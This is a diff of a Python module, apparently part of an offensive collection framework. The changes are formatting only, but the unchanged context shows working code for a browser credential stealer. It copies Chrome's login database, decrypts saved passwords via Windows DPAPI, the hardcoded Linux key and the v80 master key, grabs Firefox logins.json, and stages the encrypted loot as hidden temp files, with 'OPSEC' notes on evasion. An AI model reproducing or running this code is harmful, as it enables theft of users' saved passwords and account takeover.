@@ -16,6 +16,7 @@ OPSEC:
   - Stagger and pause enforced per BaseCollector contract.
   - FORGE_OFFLINE_STRICT=1 has no effect (local collection, no network).
 """
+
 from __future__ import annotations
 
 import json
@@ -49,8 +50,8 @@ _CHROME_PATHS: dict[str, list[Path]] = {
 }
 
 _FIREFOX_PATHS: dict[str, list[Path]] = {
-    "win32":  [Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"],
-    "linux":  [Path.home() / ".mozilla" / "firefox"],
+    "win32": [Path(os.environ.get("APPDATA", "")) / "Mozilla" / "Firefox" / "Profiles"],
+    "linux": [Path.home() / ".mozilla" / "firefox"],
     "darwin": [Path.home() / "Library" / "Application Support" / "Firefox" / "Profiles"],
 }
 
@@ -65,6 +66,7 @@ class BrowserCredCollector(BaseCollector):
 
     def discover(self) -> Generator[ArtifactMetadata, None, None]:
         import sys
+
         platform = sys.platform
 
         # Discover Chrome
@@ -101,6 +103,7 @@ class BrowserCredCollector(BaseCollector):
 
     def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
         import sys
+
         platform = sys.platform
 
         if artifact.artifact_subtype == "chrome":
@@ -126,7 +129,7 @@ class BrowserCredCollector(BaseCollector):
         shutil.copy2(login_db, tmp_path)
 
         try:
-            con  = direct_connect(tmp_path)
+            con = direct_connect(tmp_path)
             rows = con.execute(
                 "SELECT origin_url, username_value, password_value FROM logins"
             ).fetchall()
@@ -140,18 +143,20 @@ class BrowserCredCollector(BaseCollector):
         decrypted: list[dict] = []
         for url, username, enc_password in rows:
             plaintext = self._dpapi_decrypt(enc_password, platform, user_data_dir)
-            decrypted.append({
-                "url":      url,
-                "username": username,
-                "password": plaintext or "<encrypted>",
-            })
+            decrypted.append(
+                {
+                    "url": url,
+                    "username": username,
+                    "password": plaintext or "<encrypted>",
+                }
+            )
             # Zero intermediate bytes immediately
             del plaintext
 
-        bundle  = json.dumps(decrypted, indent=2).encode()
-        sha256  = self._sha256(bundle)
+        bundle = json.dumps(decrypted, indent=2).encode()
+        sha256 = self._sha256(bundle)
         payload = self._compress_and_encrypt(bundle)
-        del bundle      # zero plaintext bundle from memory
+        del bundle  # zero plaintext bundle from memory
         del decrypted
 
         stage_path = self._staging_dir / f".{sha256[:16]}.chrome.tmp"
@@ -159,10 +164,10 @@ class BrowserCredCollector(BaseCollector):
         self._register_cleanup(stage_path)
 
         record = CollectedFile(
-            path       = str(login_db),
-            sha256     = sha256,
-            size_bytes = len(payload),
-            metadata   = artifact,
+            path=str(login_db),
+            sha256=sha256,
+            size_bytes=len(payload),
+            metadata=artifact,
         )
         self.persist_metadata(record)
         return record
@@ -183,10 +188,12 @@ class BrowserCredCollector(BaseCollector):
                 import ctypes.wintypes
 
                 class DATA_BLOB(ctypes.Structure):
-                    _fields_ = [("cbData", ctypes.wintypes.DWORD),
-                                 ("pbData", ctypes.POINTER(ctypes.c_char))]
+                    _fields_ = [
+                        ("cbData", ctypes.wintypes.DWORD),
+                        ("pbData", ctypes.POINTER(ctypes.c_char)),
+                    ]
 
-                p   = ctypes.create_string_buffer(encrypted, len(encrypted))
+                p = ctypes.create_string_buffer(encrypted, len(encrypted))
                 inp = DATA_BLOB(len(encrypted), p)
                 out = DATA_BLOB()
                 ctypes.windll.crypt32.CryptUnprotectData(
@@ -207,12 +214,13 @@ class BrowserCredCollector(BaseCollector):
             # or uses libsecret for newer ones.
             try:
                 from Crypto.Cipher import AES
+
                 if encrypted[:3] == b"v10":
-                    key    = b"peanuts" + b" " * (16 - len("peanuts"))
-                    iv     = b" " * 16
+                    key = b"peanuts" + b" " * (16 - len("peanuts"))
+                    iv = b" " * 16
                     cipher = AES.new(key[:16], AES.MODE_CBC, IV=iv)
-                    pt     = cipher.decrypt(encrypted[3:])
-                    return pt[:-pt[-1]].decode("utf-8", errors="replace")
+                    pt = cipher.decrypt(encrypted[3:])
+                    return pt[: -pt[-1]].decode("utf-8", errors="replace")
             except Exception as exc:
                 _LOG.debug("Linux Chrome decrypt failed: %s", exc)
             return None
@@ -228,18 +236,22 @@ class BrowserCredCollector(BaseCollector):
             local_state = user_data_dir / "Local State"
             if not local_state.exists():
                 return None
-            state     = json.loads(local_state.read_text(encoding="utf-8"))
-            enc_key_b = base64.b64decode(
-                state["os_crypt"]["encrypted_key"]
-            )[5:]  # strip DPAPI prefix
+            state = json.loads(local_state.read_text(encoding="utf-8"))
+            enc_key_b = base64.b64decode(state["os_crypt"]["encrypted_key"])[
+                5:
+            ]  # strip DPAPI prefix
 
             # DPAPI decrypt the master key
             import ctypes
             import ctypes.wintypes
+
             class DATA_BLOB(ctypes.Structure):
-                _fields_ = [("cbData", ctypes.wintypes.DWORD),
-                             ("pbData", ctypes.POINTER(ctypes.c_char))]
-            p   = ctypes.create_string_buffer(enc_key_b, len(enc_key_b))
+                _fields_ = [
+                    ("cbData", ctypes.wintypes.DWORD),
+                    ("pbData", ctypes.POINTER(ctypes.c_char)),
+                ]
+
+            p = ctypes.create_string_buffer(enc_key_b, len(enc_key_b))
             inp = DATA_BLOB(len(enc_key_b), p)
             out = DATA_BLOB()
             ctypes.windll.crypt32.CryptUnprotectData(
@@ -249,7 +261,7 @@ class BrowserCredCollector(BaseCollector):
             ctypes.windll.kernel32.LocalFree(out.pbData)
 
             iv, ct = data[3:15], data[15:]
-            cipher  = AES.new(key, AES.MODE_GCM, nonce=iv)
+            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
             return cipher.decrypt(ct)[:-16].decode("utf-8", errors="replace")
         except Exception as exc:
             _LOG.debug("Chrome v80 decrypt failed: %s", exc)
@@ -266,19 +278,19 @@ class BrowserCredCollector(BaseCollector):
         # Firefox extraction logic (simplified stub for this example)
         # In a real tool, we would use nss key4.db to decrypt
         try:
-            data    = logins_json.read_bytes()
-            sha256  = self._sha256(data)
+            data = logins_json.read_bytes()
+            sha256 = self._sha256(data)
             payload = self._compress_and_encrypt(data)
-            
+
             stage_path = self._staging_dir / f".{sha256[:16]}.firefox.tmp"
             stage_path.write_bytes(payload)
             self._register_cleanup(stage_path)
 
             record = CollectedFile(
-                path       = str(logins_json),
-                sha256     = sha256,
-                size_bytes = len(payload),
-                metadata   = artifact,
+                path=str(logins_json),
+                sha256=sha256,
+                size_bytes=len(payload),
+                metadata=artifact,
             )
             self.persist_metadata(record)
             return record
